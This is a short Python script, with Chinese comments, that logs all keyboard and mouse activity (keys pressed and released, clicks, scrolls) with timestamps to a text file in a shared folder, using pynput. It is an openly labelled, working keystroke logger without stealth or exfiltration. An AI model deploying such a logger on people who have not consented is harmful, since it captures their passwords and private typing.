import os
import time
from pynput import keyboard, mouse
from datetime import datetime
from threading import Timer

# 脚本功能：记录键盘和鼠标的输入日志
# 日志文件名：logboardkeymouse_log_lognote.txt

# 指定日志文件路径
target_dir = r"F:\TempShareFolder"
log_file_path = os.path.join(target_dir, "logboardkeymouse_log_lognote.txt")

# 确保日志目录存在
if not os.path.exists(target_dir):
    os.makedirs(target_dir)

# 初始化日志文件
with open(log_file_path, "a", encoding="utf-8") as log_file:
    log_file.write("=" * 50 + "\n")
    log_file.write(f"KeyMouseLogger Started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
    log_file.write("=" * 50 + "\n")

# 键盘事件处理
def on_key_press(key):
    with open(log_file_path, "a", encoding="utf-8") as log_file:
        try:
            log_file.write(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - Key Pressed: {key.char}\n")
        except AttributeError:
            log_file.write(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - Special Key Pressed: {key}\n")

def on_key_release(key):
    with open(log_file_path, "a", encoding="utf-8") as log_file:
        log_file.write(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - Key Released: {key}\n")

# 鼠标事件处理
def on_click(x, y, button, pressed):
    with open(log_file_path, "a", encoding="utf-8") as log_file:
        action = "Pressed" if pressed else "Released"
        log_file.write(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - Mouse {action} at ({x}, {y}) with {button}\n")

def on_scroll(x, y, dx, dy):
    with open(log_file_path, "a", encoding="utf-8") as log_file:
        log_file.write(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - Mouse Scrolled at ({x}, {y}) by ({dx}, {dy})\n")

# 定时记录时间
def log_current_time():
    with open(log_file_path, "a", encoding="utf-8") as log_file:
        log_file.write(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - Periodic Time Log\n")
    Timer(180, log_current_time).start()  # 每 180 秒（3 分钟）记录一次

# 启动监听器
def start_logger():
    # 启动定时记录时间
    log_current_time()

    # 键盘监听器
    with keyboard.Listener(on_press=on_key_press, on_release=on_key_release) as key_listener, \
         mouse.Listener(on_click=on_click, on_scroll=on_scroll) as mouse_listener:
        key_listener.join()
        mouse_listener.join()

if __name__ == "__main__":
    print("KeyMouseLogger is running... Press Ctrl+C to stop manually.")
    start_logger()
